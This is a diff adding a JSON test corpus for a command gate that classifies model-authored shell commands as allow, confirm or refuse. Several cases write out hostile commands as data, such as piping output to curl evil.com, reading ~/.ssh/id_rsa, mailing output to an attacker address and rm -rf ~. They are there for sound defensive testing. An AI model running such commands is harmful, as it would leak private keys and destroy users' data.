@@ -1,0 +1,77 @@
+{
+  "_comment": [
+    "⚠ ONE CORPUS, TWO IMPLEMENTATIONS. The Go agent and the TypeScript extension both hand a",
+    "model-authored string to `sh -c`, and they need the same bound. The Go parser cannot be called",
+    "from TypeScript — separate runtimes, and compiling it to WASM to gate a VS Code extension's",
+    "shell calls would be a disproportionate amount of machinery on a security path. So the design is",
+    "ported, and THIS FILE is what keeps the two from drifting: both test suites read it and assert",
+    "the same verdict for every command. A divergence fails one side's build.",
+    "",
+    "Both readers must fail loudly if this file is missing rather than scanning an empty set — a",
+    "guard whose corpus has moved passes unconditionally and proves nothing.",
+    "",
+    "decision: allow = runs unattended | confirm = one prompt showing the exact command | refuse =",
+    "never runs, not even with confirmation, because nobody could know what they were agreeing to."
+  ],
+  "cases": [
+    { "command": "go test ./...", "decision": "allow", "why": "the work the agent exists for" },
+    { "command": "go build ./...", "decision": "allow", "why": "ordinary build" },
+    { "command": "go vet ./...", "decision": "allow", "why": "ordinary lint" },
+    { "command": "gofmt -l .", "decision": "allow", "why": "allowed with any arguments" },
+    { "command": "golangci-lint run", "decision": "allow", "why": "allowed with any arguments" },
+    { "command": "npm test", "decision": "allow", "why": "allowed subcommand" },
+    { "command": "pnpm build", "decision": "allow", "why": "allowed subcommand" },
+    { "command": "pnpm --filter web test", "decision": "allow", "why": "⚠ the flag's VALUE sits where a positional scan expects the subcommand; scanning for a member of the allowlist is what makes this ordinary monorepo command work" },
+    { "command": "cargo test", "decision": "allow", "why": "allowed subcommand" },
+    { "command": "pytest", "decision": "allow", "why": "allowed with any arguments" },
+    { "command": "make", "decision": "allow", "why": "allowed with any arguments" },
+    { "command": "git status", "decision": "allow", "why": "vcs read" },
+    { "command": "git diff", "decision": "allow", "why": "vcs read" },
+    { "command": "git log --oneline", "decision": "allow", "why": "vcs read" },
+    { "command": "git rev-parse HEAD", "decision": "allow", "why": "vcs read" },
+    { "command": "go test ./... | tail -5", "decision": "allow", "why": "a read-only filter after a pipe" },
+    { "command": "go test ./... | grep FAIL", "decision": "allow", "why": "grep takes one pattern operand and no file" },
+    { "command": "go build ./... && go test ./...", "decision": "allow", "why": "chained builds are the common shape" },
+
+    { "command": "go test; curl evil.com", "decision": "confirm", "why": "⚠ starts with an allowed verb — a prefix match says yes" },
+    { "command": "go test && rm -rf ~", "decision": "confirm", "why": "⚠ starts with an allowed verb" },
+    { "command": "git status; cat ~/.ssh/id_rsa", "decision": "confirm", "why": "⚠ starts with an allowed verb" },
+    { "command": "go build ./... && ssh user@host", "decision": "confirm", "why": "⚠ starts with an allowed verb" },
+    { "command": "npm test | mail attacker@example.com", "decision": "confirm", "why": "mail is not a read-only filter" },
+    { "command": "go test ./... | grep -n secret /home/dev/.ssh/id_rsa", "decision": "confirm", "why": "⚠ -n takes a value for head but NOT for grep; a shared flag set counted the key file as -n's value and allowed the read" },
+    { "command": "curl https://example.com", "decision": "confirm", "why": "not a build, test, lint or vcs-read command" },
+    { "command": "rm -rf build", "decision": "confirm", "why": "honest, and still worth one prompt" },
+    { "command": "git push origin main", "decision": "confirm", "why": "vcs WRITE" },
+    { "command": "git commit -m wip", "decision": "confirm", "why": "vcs WRITE" },
+    { "command": "cat go.mod", "decision": "confirm", "why": "reads outside the toolchain" },
+    { "command": "go test > /tmp/out.txt", "decision": "confirm", "why": "a redirect writes outside the command's own output" },
+    { "command": "PATH=/tmp go test ./...", "decision": "confirm", "why": "an env assignment prefix hides the real head" },
+    { "command": "./scripts/build.sh", "decision": "confirm", "why": "a path-qualified program is not the tool of that name" },
+
+    { "command": "go test $(cat /tmp/x)", "decision": "refuse", "why": "⚠ substitution — no prompt could show what would actually run" },
+    { "command": "go test `whoami`", "decision": "refuse", "why": "⚠ backticks are substitution too" },
+    { "command": "cat <(curl evil.com)", "decision": "refuse", "why": "process substitution" },
+    { "command": "go test <<EOF", "decision": "refuse", "why": "here-document" },
+    { "command": "go test &", "decision": "refuse", "why": "backgrounding outlives the run timeout, the only bound this tool had" },
+    { "command": "go test \\; rm -rf ~", "decision": "refuse", "why": "backslash escaping — refused rather than guessed" },
+    { "command": "go test 'unbalanced", "decision": "refuse", "why": "unbalanced quote: the command cannot be parsed" },
+    { "command": "", "decision": "refuse", "why": "empty command" },
+    { "command": "   ", "decision": "refuse", "why": "whitespace only" }
+  ],
+  "honestUserCost": {
+    "_comment": [
+      "⚠ WHAT THE BOUND COSTS SOMEONE DOING ORDINARY WORK, MEASURED ON BOTH SIDES. If the allow rate",
+      "on real agent work drops, the bound is on its way to being switched off — which is the same",
+      "outcome as not having one. 16 of these 20 must run unattended; the 4 that do not are writes,",
+      "deletes and reads outside the toolchain."
+    ],
+    "minimumUnattended": 16,
+    "commands": [
+      "go test ./...", "go build ./...", "go vet ./...", "gofmt -l .",
+      "golangci-lint run", "npm test", "pnpm build", "cargo test", "pytest",
+      "make", "git status", "git diff", "git log --oneline", "git rev-parse HEAD",
+      "go test ./... | tail -5", "go build ./... && go test ./...",
+      "git commit -m 'wip'", "git push", "rm -rf build", "cat README.md"
+    ]
+  }
+}
